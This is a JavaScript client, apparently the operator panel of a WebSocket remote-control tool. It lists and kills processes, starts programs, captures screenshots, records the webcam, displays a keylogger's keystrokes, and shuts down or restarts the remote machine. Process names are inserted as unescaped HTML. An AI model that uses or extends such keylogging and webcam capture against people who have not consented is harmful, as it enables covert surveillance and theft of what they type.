document.addEventListener('DOMContentLoaded', () => {

    // --- CẤU HÌNH ---

    // --- BIẾN TOÀN CỤC ---
    let ws;
    let currentView = 'applications';
    let lastLoggedKeyCode = null;

    // --- BỘ CHỌN DOM (DOM Selectors) ---
    const $ = (selector) => document.querySelector(selector);
    const $$ = (selector) => document.querySelectorAll(selector);

    // Webcam view
    const btnStartRecord = $('#btn-start-record');
    const btnStopRecord = $('#btn-stop-record');
    const webcamSpinner = $('#webcam-spinner');
    const webcamPlaceholder = $('#webcam-placeholder');
    const webcamVideoOutput = $('#webcam-video-output');
    const webcamStatus = $('#webcam-status');
    const modalWebcamDevice = $('#modal-webcam-device');

    // Webcam Modal Inputs
    const inputWebcamDuration = $('#input-webcam-duration'); // THÊM DÒNG NÀY
    const inputWebcamDeviceName = $('#input-webcam-device-name'); // Đã có, chỉ làm rõ


    // Trạng thái & Điều khiển kết nối
    const statusIndicator = $('#status-indicator');
    const wsUrlInput = $('#ws-url-input');
    const btnConnect = $('#btn-connect');
    const btnDisconnect = $('#btn-disconnect');

    // Thanh bên & Views
    const sidebar = $('#sidebar');
    const contentViews = $$('.content-view');

    // Tables
    const processesTbody = $('#processes-table tbody');
    const appsTbody = $('#apps-table tbody');

    // Keylogger
    const keylogToggle = $('#keylog-toggle');
    const keylogOutput = $('#keylog-output');

    // Modals
    const modalBackdrop = $('#modal-backdrop');
    const modalStartProcess = $('#modal-start-process');
    const modalStartApp = $('#modal-start-app');

    // Capture View
    const btnTakeScreenshot = $('#btn-take-screenshot');
    const captureSpinner = $('#capture-spinner');
    const captureImg = $('#capture-img');
    const capturePlaceholder = $('#capture-placeholder');
    const btnCopyScreenshot = $('#btn-copy-screenshot');

    // Help View
    const helpContent = $('#help-content');

    // System Control View
    const viewSystemControl = $('#view-system-control');

    // Nút bấm
    const btnStartApp = $('#btn-start-app');

    // THÊM 2 BỘ CHỌN NÀY
    const btnSystemShutdown = $('#btn-system-shutdown');
    const btnSystemRestart = $('#btn-system-restart');

    // Theme
    const themeToggle = $('#theme-toggle');
    const bodyEl = document.body;

    // --- LOGIC WEBSOCKET ---

    function connectWs() {
        const url = wsUrlInput.value;
        if (!url) {
            alert('Please enter a WebSocket URL');
            return;
        }

        console.log(`Đang kết nối đến ${url}...`);
        wsUrlInput.disabled = true;
        btnConnect.classList.add('hidden');
        btnDisconnect.classList.remove('hidden');

        ws = new WebSocket(url);

        ws.onopen = onWsOpen;
        ws.onmessage = onWsMessage;
        ws.onclose = onWsClose;
        ws.onerror = onWsError;
    }

    function disconnectWs() {
        if (ws) {
            ws.close();
        }
    }

    function onWsOpen() {
        console.log('Đã kết nối WebSocket.');
        statusIndicator.className = 'dot green';
        wsUrlInput.value = ws.url;
        loadDataForView(currentView);
    }

    function onWsClose() {
        console.log('Đã ngắt kết nối WebSocket.');
        statusIndicator.className = 'dot red';
        wsUrlInput.disabled = false;
        btnConnect.classList.remove('hidden');
        btnDisconnect.classList.add('hidden');
        lastLoggedKeyCode = null; // Reset khi mất kết nối
        ws = null;

        // Xóa dữ liệu khỏi bảng
        renderProcessTable([]);
        renderAppTable([]);

        // Reset Keylogger
        keylogOutput.textContent = 'Disconnected. Waiting to connect...';
        keylogToggle.checked = false;

        // Ẩn nút copy khi mất kết nối
        btnCopyScreenshot.classList.add('hidden');
    }

    function onWsError(err) {
        console.error('WebSocket Error:', err);
        alert('Connection failed. Check the URL or server status.');
        // onWsClose sẽ tự động được gọi sau khi lỗi
    }

    /**
     * @param {MessageEvent} event
     */
    function onWsMessage(event) {
        const msg = JSON.parse(event.data);
        console.log('WS RECV:', msg);

        switch (msg.type) {
            case 'process_list':
                renderProcessTable(msg.data);
                break;
            case 'application_list':
                renderAppTable(msg.data);
                break;
            case 'screenshot':
                captureSpinner.classList.add('hidden');
                captureImg.src = `data:image/png;base64,${msg.data}`;
                captureImg.classList.remove('hidden');
                capturePlaceholder.classList.add('hidden');
                btnCopyScreenshot.classList.remove('hidden');
                break;
            case 'webcam_recording_status':
                handleWebcamStatus(msg);
                break;

            case 'webcam_video':
                handleWebcamVideo(msg.data);
                break;
            case 'key_event':
                handleKeyEvent(msg.key_code);
                break;
            case 'help':
                helpContent.textContent = msg.commands.join('\n');
                break;
            case 'status':
                handleStatus(msg);
                if (msg.message === 'capture failed') {
                    captureSpinner.classList.add('hidden');
                    captureImg.classList.add('hidden');
                    capturePlaceholder.classList.remove('hidden');
                    btnCopyScreenshot.classList.add('hidden');
                }
                break;
            case 'error':
                alert(`Server Error: ${msg.message}`);
                break;
            
        }
    }

    /**
     * Gửi lệnh JSON đến WebSocket Server
     * @param {object} payload 
     */
    function sendWsMessage(payload) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            console.log('WS SEND:', payload);
            ws.send(JSON.stringify(payload));
        } else {
            alert('Not connected. Please connect to the server first.');
        }
    }

    // --- LOGIC XỬ LÝ (Handlers) ---

    function renderProcessTable(processes) {
        // Luôn hiển thị "Không có dữ liệu" khi mảng rỗng
        if (!processes || processes.length === 0) {
            processesTbody.innerHTML = '<tr><td colspan="4">Không có dữ liệu.</td></tr>';
            return;
        }
        const formatter = new Intl.NumberFormat('en-US');
        processesTbody.innerHTML = processes.map(p => `
            <tr>
                <td>${p.pid}</td>
                <td>${p.name}</td>
                <td>${p.workingSet ? formatter.format(p.workingSet) + ' B' : 'N/A'}</td>
                <td>
                    <button class="btn btn-danger btn-sm" data-action="stop-proc" data-pid="${p.pid}">
                        Stop
                    </button>
                </td>
            </tr>
        `).join('');
    }

    function renderAppTable(apps) {
        // Luôn hiển thị "Không có dữ liệu" khi mảng rỗng
        if (!apps || apps.length === 0) {
            appsTbody.innerHTML = '<tr><td colspan="3">Không có dữ liệu.</td></tr>';
            return;
        }
        appsTbody.innerHTML = apps.map(a => `
            <tr>
                <td>${a.name}</td>
                <td>${a.process_count}</td>
                <td>
                    <button class="btn btn-danger btn-sm" data-action="stop-app" data-name="${a.name}">
                        Stop
                    </button>
                </td>
            </tr>
        `).join('');
    }

    function handleKeyEvent(keyCode) {

        const spammyKeys = [
            160, 161, // Shift
            162, 163, // Ctrl
            164, 165, // Alt
            20, // CapsLk
            144, // NumLock
            91, 92 // Win
        ];

        if (spammyKeys.includes(keyCode) && keyCode === lastLoggedKeyCode) {
            return;
        }

        lastLoggedKeyCode = keyCode;

        if (keyCode === 231) {
            return;
        }

        if (keylogOutput.textContent.startsWith('Keylogger started') || keylogOutput.textContent.startsWith('Disconnected')) {
            keylogOutput.textContent = '';
        }

        function translateKeyCode(code) {
            if (code >= 65 && code <= 90) { return String.fromCharCode(code); }
            if (code >= 48 && code <= 57) { return String.fromCharCode(code); }
            if (code >= 96 && code <= 105) { return `[Num ${code - 96}]`; }
            switch (code) {
                case 8:
                    return '[Backspace]';
                case 9:
                    return '[Tab]';
                case 13:
                    return '\n[Enter]\n';
                case 19:
                    return '[Pause]';
                case 20:
                    return '[CapsLk]';
                case 27:
                    return '[Esc]';
                case 32:
                    return '[Space]';
                case 33:
                    return '[PgUp]';
                case 34:
                    return '[PgDn]';
                case 35:
                    return '[End]';
                case 36:
                    return '[Home]';
                case 37:
                    return '[Left]';
                case 38:
                    return '[Up]';
                case 39:
                    return '[Right]';
                case 40:
                    return '[Down]';
                case 44:
                    return '[PrtSc]';
                case 45:
                    return '[Insert]';
                case 46:
                    return '[Delete]';
                case 106:
                    return '[Num *]';
                case 107:
                    return '[Num +]';
                case 109:
                    return '[Num -]';
                case 110:
                    return '[Num .]';
                case 111:
                    return '[Num /]';
                case 144:
                    return '[NumLock]';
                case 112:
                    return '[F1]';
                case 113:
                    return '[F2]';
                case 114:
                    return '[F3]';
                case 115:
                    return '[F4]';
                case 116:
                    return '[F5]';
                case 117:
                    return '[F6]';
                case 118:
                    return '[F7]';
                case 119:
                    return '[F8]';
                case 120:
                    return '[F9]';
                case 121:
                    return '[F10]';
                case 122:
                    return '[F11]';
                case 123:
                    return '[F12]';
                case 160:
                    return '[LShift]';
                case 161:
                    return '[RShift]';
                case 162:
                    return '[LCtrl]';
                case 163:
                    return '[RCtrl]';
                case 164:
                    return '[LAlt]';
                case 165:
                    return '[RAlt]';
                case 186:
                    return ';';
                case 187:
                    return '=';
                case 188:
                    return ',';
                case 189:
                    return '-';
                case 190:
                    return '.';
                case 191:
                    return '/';
                case 192:
                    return '`';
                case 219:
                    return '[';
                case 220:
                    return '\\';
                case 221:
                    return ']';
                case 222:
                    return "'";
                case 91:
                    return '[LWin]';
                case 92:
                    return '[RWin]';
                case 93:
                    return '[Menu]';
                default:
                    return `[${code}]`;
            }
        }

        const char = translateKeyCode(keyCode);

        keylogOutput.textContent += char;
        keylogOutput.scrollTop = keylogOutput.scrollHeight;
    }

    function handleStatus(msg) {
        const command = msg.command || (msg.success && msg.pid ? 'start_process' : '');

        if (command.includes('start') || command.includes('stop')) {
            alert(`Status: ${msg.success ? 'Success' : 'Failed'}\nMessage: ${msg.message || 'N/A'}`);
        }

        // Cập nhật lại view BẢNG nếu hành động thành công
        if (msg.success && (command === 'stop_process_pid' || command === 'start_process')) {
            if (currentView === 'processes-table') loadDataForView('processes-table');
        }
        if (msg.success && (command === 'stop_application' || command === 'start_application')) {
            if (currentView === 'applications-table') loadDataForView('applications-table');
        }
    }

    function handleWebcamStatus(msg) {
        // Cập nhật trạng thái hiển thị
        webcamStatus.textContent = `Status: ${msg.message}`;
        webcamStatus.classList.remove('hidden');

        if (msg.message.includes('started')) {
            // Bắt đầu
            btnStartRecord.classList.add('hidden');
            btnStopRecord.classList.remove('hidden'); // Vẫn cho phép hủy khẩn cấp
            webcamPlaceholder.classList.add('hidden');
            webcamSpinner.classList.remove('hidden');
            webcamVideoOutput.classList.add('hidden');
        } else if (msg.message.includes('error') || msg.message.includes('cancelled')) {
            // Lỗi hoặc Hủy bỏ: Reset ngay lập tức
            btnStartRecord.classList.remove('hidden');
            btnStopRecord.classList.add('hidden'); // Ẩn nút Stop sau khi hoàn tất
            webcamSpinner.classList.add('hidden');
            
            if (msg.message.includes('cancelled')) {
                 webcamPlaceholder.textContent = 'Recording was cancelled.';
            } else {
                 webcamPlaceholder.textContent = `Recording failed: ${msg.message}`;
            }
            webcamPlaceholder.classList.remove('hidden');
            
        } else if (msg.message.includes('completed')) {
            // Hoàn thành: Chỉ cập nhật trạng thái chờ, KHÔNG reset nút
            webcamSpinner.classList.add('hidden');
            webcamPlaceholder.textContent = 'Recording complete. Waiting for file transfer...';
            webcamPlaceholder.classList.remove('hidden');
        }
    }
    
    function handleWebcamVideo(base64Data) {
        // 1. Hiển thị video
        webcamSpinner.classList.add('hidden');
        webcamPlaceholder.classList.add('hidden');
        webcamVideoOutput.src = `data:video/mp4;base64,${base64Data}`;
        webcamVideoOutput.classList.remove('hidden');
        webcamStatus.textContent = 'Status: Video received and ready to play.';
        
        // 2. Reset nút bấm (QUAN TRỌNG: Quá trình đã hoàn tất)
        btnStartRecord.classList.remove('hidden');
        btnStopRecord.classList.add('hidden');

        // Tự động phát (có thể thất bại do chính sách trình duyệt)
        webcamVideoOutput.play().catch(e => console.log('Autoplay failed:', e));
    }

    // --- HÀM COPY ẢNH (VỚI 2 LỚP FALLBACK) ---
    /**
     * Cố gắng copy ảnh bằng API nâng cao.
     * Nếu thất bại (do http), chuyển sang copy text Base64.
     * Nếu thất bại nữa (do http), dùng execCommand cũ.
     */
    async function copyScreenshotToClipboard() {
        if (!captureImg.src || captureImg.classList.contains('hidden')) {
            alert('Không có ảnh để copy.');
            return;
        }

        // --- CÁCH 1: API NÂNG CAO (Copy ảnh thật) ---
        // Sẽ thất bại trên http://<IP>
        if (navigator.clipboard && navigator.clipboard.write && typeof ClipboardItem === 'function') {
            try {
                const response = await fetch(captureImg.src);
                const blob = await response.blob();
                const item = new ClipboardItem({ [blob.type]: blob });
                await navigator.clipboard.write([item]);

                // Báo thành công
                showCopySuccess('Đã copy ảnh!');
                return; // Xong
            } catch (err) {
                console.warn('Lỗi API copy nâng cao (thử fallback 1):', err);
                // Thử cách 2...
            }
        }

        // --- CÁCH 2: API Fallback (Copy text) ---
        // Cũng sẽ thất bại trên http://<IP>
        if (navigator.clipboard && navigator.clipboard.writeText) {
            try {
                const base64Data = captureImg.src.split(',')[1];
                await navigator.clipboard.writeText(base64Data);
                
                showCopySuccess('Đã copy (Base64)!');
                return; // Xong
            } catch (err) {
                console.warn('Lỗi API copy text (thử fallback 2):', err);
                // Thử cách 3...
            }
        }

        // --- CÁCH 3: Fallback cuối cùng (dùng execCommand) ---
        // Dùng cho các bối cảnh http không an toàn
        console.log("Dùng fallback cuối cùng: execCommand.");
        try {
            const base64Data = captureImg.src.split(',')[1];
            const textArea = document.createElement('textarea');
            textArea.value = base64Data;
            
            // Ngăn cuộn trang khi focus
            textArea.style.top = "0";
            textArea.style.left = "0";
            textArea.style.position = "fixed";

            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();

            const successful = document.execCommand('copy');
            
            document.body.removeChild(textArea);

            if (successful) {
                showCopySuccess('Đã copy (Base64)!');
            } else {
                throw new Error('document.execCommand không thành công');
            }
        } catch (err) {
            console.error('Lỗi khi copy text (Fallback cuối):', err);
            alert('Tất cả các phương thức copy đều thất bại. Vui lòng copy thủ công.');
        }
    }

    /**
     * Hàm helper để hiển thị thông báo copy thành công
     */
    function showCopySuccess(message) {
        const originalText = btnCopyScreenshot.innerHTML;
        btnCopyScreenshot.innerHTML = `<i data-feather="check"></i> ${message}`;
        feather.replace();
        setTimeout(() => {
            btnCopyScreenshot.innerHTML = originalText;
            feather.replace();
        }, 2000);
    }


    // --- LOGIC GIAO DIỆN (UI Logic) ---

    /**
     * Hiển thị view nội dung và xử lý trạng thái active của sidebar.
     * @param {string} viewId ID của view (ví dụ: 'processes', 'processes-table', 'keylogger')
     */
    function showView(viewId) {
        currentView = viewId;
        contentViews.forEach(view => view.classList.remove('active'));
        
        const newViewEl = $(`#view-${viewId}`); // ví dụ: #view-processes-table
        if (newViewEl) {
            newViewEl.classList.add('active');
        } else {
            console.error(`View "#view-${viewId}" not found!`);
            return;
        }

        $$('#sidebar .nav-item').forEach(item => item.classList.remove('active'));
        
        // Kiểm tra xem view này có "cha" trong sidebar không (ví dụ: data-parent-view="processes")
        const parentView = newViewEl.dataset.parentView; // ví dụ: "processes"
        
        let activeSidebarItem;
        if (parentView) {
            // Đây là view con, kích hoạt "cha" của nó trong sidebar
            activeSidebarItem = $(`#sidebar .nav-item[data-view="${parentView}"]`);
        } else {
            // Đây là view chính (như keylogger, help)
            activeSidebarItem = $(`#sidebar .nav-item[data-view="${viewId}"]`);
        }
        
        if (activeSidebarItem) {
            activeSidebarItem.classList.add('active');
        }

        // Chỉ tải dữ liệu nếu đã kết nối
        if (ws && ws.readyState === WebSocket.OPEN) {
            loadDataForView(viewId);
        }

        lastLoggedKeyCode = null;
    }

    /**
     * Tải dữ liệu cho view dựa trên viewId.
     * Chỉ tải khi view là view BẢNG.
     */
    function loadDataForView(viewId) {
        if (viewId === 'processes-table') {
            // Chỉ tải khi view là BẢNG processes
            sendWsMessage({ command: 'list_processes' });
        } else if (viewId === 'applications-table') {
            // Chỉ tải khi view là BẢNG applications
            sendWsMessage({ command: 'list_applications' });
        } else if (viewId === 'help') {
            sendWsMessage({ command: 'help' });
        }
        // Các view 'processes' và 'applications' (menu) sẽ không làm gì cả
    }

    function showModal(modalId) {
        $(`#${modalId}`).classList.remove('hidden');
        modalBackdrop.classList.remove('hidden');
    }

    function hideAllModals() {
        $$('.modal').forEach(modal => modal.classList.add('hidden'));
        modalBackdrop.classList.add('hidden');
    }

    // --- LOGIC THEME ---

    function setTheme(theme) {
        if (theme === 'dark') {
            bodyEl.classList.add('dark-theme');
            themeToggle.checked = true;
        } else {
            bodyEl.classList.remove('dark-theme');
            themeToggle.checked = false;
        }
        localStorage.setItem('app-theme', theme);
    }

    function initTheme() {
        const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        const savedTheme = localStorage.getItem('app-theme');

        if (savedTheme) {
            setTheme(savedTheme);
        } else {
            setTheme(prefersDark ? 'dark' : 'light');
        }

        themeToggle.addEventListener('change', (e) => {
            setTheme(e.target.checked ? 'dark' : 'light');
        });
    }

    // --- KHỞI TẠO EVENT LISTENERS ---
    function initEventListeners() {

        // Điền URL mặc định: dùng cùng host/port với trang web, path /ws
        const defaultWsProtocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
        wsUrlInput.value = `${defaultWsProtocol}://${window.location.host}/ws`;

        // Nút Connect / Disconnect
        btnConnect.addEventListener('click', connectWs);
        btnDisconnect.addEventListener('click', disconnectWs);

        // Chuyển view
        sidebar.addEventListener('click', (e) => {
            const navItem = e.target.closest('.nav-item');
            if (navItem) {
                showView(navItem.dataset.view);
            }
        });

        // Nút bấm thanh công cụ
        $('#btn-start-process').addEventListener('click', () => showModal('modal-start-process'));
        btnStartApp.addEventListener('click', () => showModal('modal-start-app'));

        btnTakeScreenshot.addEventListener('click', () => {
            captureSpinner.classList.remove('hidden');
            captureImg.classList.add('hidden');
            capturePlaceholder.classList.add('hidden');
            btnCopyScreenshot.classList.add('hidden');
            sendWsMessage({ command: 'capture_screen' });
        });

        // Thêm sự kiện click cho nút copy
        btnCopyScreenshot.addEventListener('click', copyScreenshotToClipboard);

        // Keylogger toggle
        keylogToggle.addEventListener('change', (e) => {
            // Không làm gì nếu chưa kết nối
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                e.target.checked = false;
                alert('Please connect to the server first.');
                return;
            }

            if (e.target.checked) {
                keylogOutput.textContent = 'Keylogger started, waiting for events...';
                sendWsMessage({ command: 'start_keylog' });
            } else {
                keylogOutput.textContent = 'Keylogger stopped.';
                sendWsMessage({ command: 'stop_keylog' });
            }
            lastLoggedKeyCode = null; // Reset khi bật/tắt
        });

        // Nút bấm trong Modal
        modalBackdrop.addEventListener('click', hideAllModals);
        $$('.modal [data-action="cancel"]').forEach(btn => btn.addEventListener('click', hideAllModals));

        // Nút Start Process (Modal)
        $('#modal-start-process [data-action="confirm"]').addEventListener('click', () => {
            const path = $('#input-proc-path').value;
            const args = $('#input-proc-args').value;
            if (path) {
                sendWsMessage({ command: 'start_process', path: path, args: args, 'command': 'start_process' });
                hideAllModals();
                $('#input-proc-path').value = '';
                $('#input-proc-args').value = '';
            } else {
                alert('Process Path is required.');
            }
        });

        // Nút Start Application (Modal)
        $('#modal-start-app [data-action="confirm"]').addEventListener('click', () => {
            const name = $('#input-app-name').value;
            if (name) {
                sendWsMessage({ command: 'start_application', app_name: name, 'command': 'start_application' });
                hideAllModals();
                $('#input-app-name').value = '';
            } else {
                alert('App Name is required.');
            }
        });

        // Nút Stop (trong bảng) VÀ Lựa chọn Menu
        $('#main-content').addEventListener('click', (e) => {
            const target = e.target;
            
            // Xử lý bấm vào item trong .action-list
            const actionListItem = target.closest('[data-action="show-view"]');
            if (actionListItem) {
                const targetViewId = actionListItem.dataset.target; // ví dụ: "processes-table"
                showView(targetViewId);
                return; // Dừng lại
            }

            // Xử lý nút stop
            const action = target.dataset.action;

            if (action === 'stop-proc') {
                const pid = parseInt(target.dataset.pid, 10);
                if (confirm(`Are you sure you want to stop process ${pid}?`)) {
                    sendWsMessage({ command: 'stop_process_pid', pid: pid, 'command': 'stop_process_pid' });
                }
            }

            if (action === 'stop-app') {
                const name = target.dataset.name;
                if (confirm(`Are you sure you want to stop all processes for "${name}"?`)) {
                    sendWsMessage({ command: 'stop_application', app_name: name, 'command': 'stop_application' });
                }
            }
        });

        // Nút Start/Stop Record
        btnStartRecord.addEventListener('click', () => {
            // Luôn hiển thị Modal để người dùng có thể nhập tên thiết bị
            showModal('modal-webcam-device');
            webcamVideoOutput.classList.add('hidden');
        });
        
        btnStopRecord.addEventListener('click', () => {
            sendWsMessage({ command: 'stop_webcam_record' });
            // Cập nhật giao diện ngay lập tức
            btnStopRecord.classList.add('hidden');
            btnStartRecord.classList.remove('hidden');
            webcamSpinner.classList.add('hidden');
            webcamStatus.textContent = 'Status: Stopping recording...';
        });

        // Nút Start Recording (trong Modal)
        $('#modal-webcam-device [data-action="confirm"]').addEventListener('click', () => {
            const deviceName = inputWebcamDeviceName.value.trim();
            const duration = parseInt(inputWebcamDuration.value, 10);
            
            if (isNaN(duration) || duration <= 0) {
                alert('Duration must be a positive number in seconds.');
                return;
            }

            // Gửi lệnh Start kèm theo thời gian và tên thiết bị
            sendWsMessage({ 
                command: 'start_webcam_record', 
                device_name: deviceName,
                time: duration // TRƯỜNG "time" ĐƯỢC GỬI Ở ĐÂY
            });
            
            hideAllModals();
            
            // Thiết lập trạng thái chờ
            btnStartRecord.classList.add('hidden');
            btnStopRecord.classList.remove('hidden'); // Hiển thị nút Cancel/Emergency Stop
            webcamSpinner.classList.remove('hidden');

            webcamStatus.textContent = `Status: Starting record for ${duration} seconds... (Device: ${deviceName || 'Default'})`;
            webcamStatus.classList.remove('hidden');
            webcamPlaceholder.classList.add('hidden');
            webcamVideoOutput.classList.add('hidden');
        });

        // === LOGIC CHO VIEW SYSTEM CONTROL ===
        if (viewSystemControl) {
            viewSystemControl.addEventListener('click', (e) => {
                const target = e.target.closest('li');
                if (!target) return;
                
                if (target.id === 'btn-system-shutdown') {
                    if (confirm('CẢNH BÁO: Bạn có chắc chắn muốn TẮT máy chủ từ xa không?')) {
                        sendWsMessage({ command: 'system_shutdown', 'command': 'system_shutdown' });
                    }
                } else if (target.id === 'btn-system-restart') {
                    if (confirm('CẢNH BẢO: Bạn có chắc chắn muốn KHỞI ĐỘNG LẠI máy chủ từ xa không?')) {
                        sendWsMessage({ command: 'system_restart', 'command': 'system_restart' });
                    }
                }
            });
        }
    }

    // --- KHỞI ĐỘNG ---
    initTheme();
    initEventListeners();

    showView(currentView); // Hiển thị view mặc định (menu 'applications')
    feather.replace(); // Kích hoạt icon
});